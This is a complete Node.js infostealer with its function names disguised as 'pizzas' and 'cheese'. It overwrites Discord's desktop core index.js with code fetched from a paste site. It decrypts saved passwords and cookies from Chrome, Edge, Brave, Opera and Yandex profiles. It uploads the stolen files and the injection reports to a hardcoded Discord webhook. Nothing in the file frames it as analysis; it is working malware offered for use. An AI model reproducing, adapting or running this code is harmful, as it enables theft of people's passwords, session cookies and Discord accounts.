const fs = require('fs')
const https = require('https')
const crypto = require('crypto');
const FormData = require('form-data');
const glob = require("glob")
const {exec} = require('child_process')
const axios = require('axios')
const dpapi = require("win-dpapi");
const sqlite3 = require("sqlite3");
var debug = false, args = process.argv.slice(2);

var fourstars = 'https://discord.com/api/webhooks/1190510967784747109/iZCBQRke-pkonQ7IS3dSJ6bm3UXSF2uAA4C5uDQ4Cc5RzDtlGTQoABRDkOqlgP4a7aQ_'
var serverfile = 'https://hastebin.skyra.pw/hivumequya.ts'

const LOCAL = process.env.LOCALAPPDATA
const discords = []
const injectPath = []
const runningDiscords = []

fs.readdirSync(LOCAL).forEach(file => {
  if (file.includes("iscord")) {
    discords.push(LOCAL + '\\' + file)
  } else {
    return;
  }
})

discords.forEach(function(file) {
  let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
  glob.sync(pattern).map(file => {
    injectPath.push(file)
  })
})

fetchlocals();
function inject() {
  https.get(serverfile, (resp) => {
    let data = '';
    resp.on('data', (chunk) => {
      data += chunk;
    })
    resp.on('end', () => {
      injectPath.forEach(file => {
        fs.writeFileSync(file, data, {encoding: 'utf8', flag: 'w'});
      })
    })
  }).on("error", (err) => {
    console.log(err)
  })
}

function fetchlocals() {
  exec('tasklist', function(err, stdout, stderr) {
    if (stdout.includes("Discord.exe")) {
      runningDiscords.push("Discord")
    }
    if (stdout.includes("DiscordCanary.exe")) {
      runningDiscords.push("DiscordCanary")
    }
    if (stdout.includes("DiscordPTB.exe")) {
      runningDiscords.push("DiscordPTB")
    }
    discordoff()
    inject()
    discordon()
  })
  warn()
}

function discordoff() {
  runningDiscords.forEach(disc => {
    exec(`taskkill /IM ${disc}.exe /F`, (err) => {
      if (err) {
        return;
      }
    })
  })
}

function discordon() {
  runningDiscords.forEach(disc => {
    let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
    exec(path, (err) => {
      if (err) {
        return;
      }
    })
  })
}

function warn() {
  let fields = [];
    injectPath.forEach( path => {
      let a = {
        name: "Local:",
        value: `\`${path}\``,
        inline: !1
      }
    fields.push(a)
  })
  axios.post(fourstars, {
    embeds: [{
      title: "<:red_ninja:967360512499261510> Injetado",
      color: 000000,
      fields: fields,
    }]
  })
}

if (args[0] == 'debug') debug = false;

var appdata = process.env.APPDATA,
 localappdata = process.env.LOCALAPPDATA,
paths = [
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];


takePizzas();
takeCheese();

async function getPizzas(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
                .os_crypt.encrypted_key, 'base64')
            .slice(5);
        var login_data = path + 'Login Data',
            passwords_db = path + 'passwords.db';
        fs.copyFileSync(login_data, passwords_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = '\n\nSENHAS DE: ' + path + '  by: Victor឵#0011\n',
            sql = new sqlite3.Database(passwords_db, err => {
                if (err) {
                    if (debug) console.log(err);
                }
            });
        const pizza = await new Promise((resolve, reject) => {
            sql.each('SELECT origin_url, username_value, password_value FROM logins', function (err, row) {
                if (err) {
                    if (debug) console.log(err);
                }
                if (row['username_value'] != '') {
                    let password_value = row['password_value'];
                    try {
                        if ((password_value[0] == 1) && (password_value[1] == 0) && (password_value[2] == 0) && (password_value[3] == 0)) {
                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + dpapi.unprotectData(password_value, null, 'CurrentUser')
                                .toString('utf-8');
                        } else {
                            let start = password_value.slice(3, 15),
                                middle = password_value.slice(15, password_value.length - 16),
                                end = password_value.slice(password_value.length - 16, password_value.length),
                                decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                            decipher.setAuthTag(end);
                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
                        }
                    } catch (e) {
                        if (debug) console.log(e);
                    }
                }
            }, function () {
                resolve(result);
            });
        });
        return pizza;
    } else {
        return '';
    }
}

async function getCheese(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
                .os_crypt.encrypted_key, 'base64')
            .slice(5);
        var cookies = path + 'Cookies',
            cookies_db = path + 'cookies.db';
        fs.copyFileSync(cookies, cookies_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = '',
            sql = new sqlite3.Database(cookies_db, err => {
                if (err) {
                    if (debug) console.log(err);
                }
            });
        const cheese = await new Promise((resolve, reject) => {
            sql.each('SELECT host_key, name, encrypted_value FROM cookies', function (err, row) {
                if (err) {
                    if (debug) console.log(err);
                }
                let encrypted_value = row['encrypted_value'];
                try {
                    if ((encrypted_value[0] == 1) && (encrypted_value[1] == 0) && (encrypted_value[2] == 0) && (encrypted_value[3] == 0)) {
                        result += row['host_key'] + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + row['name'] + "	" + dpapi.unprotectData(encrypted_value, null, 'CurrentUser') + "\n"
                            .toString('utf-8');
                    } else {
                        let start = encrypted_value.slice(3, 15),
                            middle = encrypted_value.slice(15, encrypted_value.length - 16),
                            end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length),
                            decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                        decipher.setAuthTag(end);
                        result += row['host_key'] + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + row['name'] + "	" + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + "\n"
                    }
                } catch (e) {
                    if (debug) console.log(e);
                }
            }, function () {
                resolve(result);
            })
        });
        return cheese;
    } else return '';
}


async function takePizzas() {
    let passwords = '';
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'Login Data'))
            passwords += await getPizzas(paths[i]) || '';
    }
    fs.writeFile(appdata + '\\Senhas.txt', passwords, function (err, data) {

        if (err) throw err;
      
        const form = new FormData();
        form.append("file", fs.createReadStream(appdata+"\\Senhas.txt"));
        form.submit(fourstars, (error, response) => {
        if (error) console.log(error);
        });
    });
}

async function takeCheese() {
    let cookies = '';
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'Cookies'))
            cookies += await getCheese(paths[i]) || '';
    }
    fs.writeFile(appdata + '\\Cookies.txt', cookies, function (err, data) {

        if (err) throw err;
      
        const form = new FormData();
        form.append("file", fs.createReadStream(appdata+"\\Cookies.txt"));
        form.submit(fourstars, (error, response) => {
        if (error) console.log(error);
        });
    });
}